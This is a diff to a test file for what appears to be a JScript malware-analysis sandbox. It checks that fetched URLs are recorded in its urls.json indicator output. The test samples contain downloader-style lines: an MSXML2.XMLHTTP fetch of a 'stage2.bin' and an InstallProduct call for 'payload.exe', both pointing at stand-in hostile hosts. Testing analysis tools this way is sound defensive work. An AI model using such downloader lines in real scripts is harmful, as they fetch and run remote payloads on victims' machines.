@@ -37,7 +37,8 @@ describe("results index files", function() {
 	let run;
 	before(function() {
 		run = runSample(
-			"eval(\"var marker = 1;\");\n" +
+			"var x = new ActiveXObject(\"MSXML2.XMLHTTP\");\n" +
+			"x.open(\"GET\", \"http://example.invalid/stage2.bin\", false); x.send();\n" +
 			dropResource("first", "C:\\Users\\Public\\a.txt") +
 			dropResource("second", "C:\\Users\\Public\\b.txt")
 		);
@@ -73,7 +74,26 @@ describe("results index files", function() {
 
 	it("still writes arrays (IOC.json, urls.json) as arrays", function() {
 		assert.ok(Array.isArray(run.read("IOC.json")));
-		const urls = path.join(run.results, "urls.json");
-		if (fs.existsSync(urls)) assert.ok(Array.isArray(run.read("urls.json")));
+		assert.deepStrictEqual(run.read("urls.json"), ["http://example.invalid/stage2.bin"]);
+	});
+});
+
+describe("array index files", function() {
+	this.timeout(90000);
+
+	it("keeps every element when one is a function", function() {
+		// copyWithoutCircularReferences drops function values, so bounding the copy by the
+		// surviving key count cut the LAST element: urls.json lost the real URL.
+		const run = runSample(
+			"InstallProduct(function(){return 1;});\n" +
+			"InstallProduct(\"http://evil.example/payload.exe\");\n"
+		);
+		try {
+			const urls = run.read("urls.json");
+			assert.ok(Array.isArray(urls));
+			assert.ok(urls.includes("http://evil.example/payload.exe"), JSON.stringify(urls));
+		} finally {
+			fs.rmSync(run.work, {recursive: true, force: true});
+		}
 	});
 });
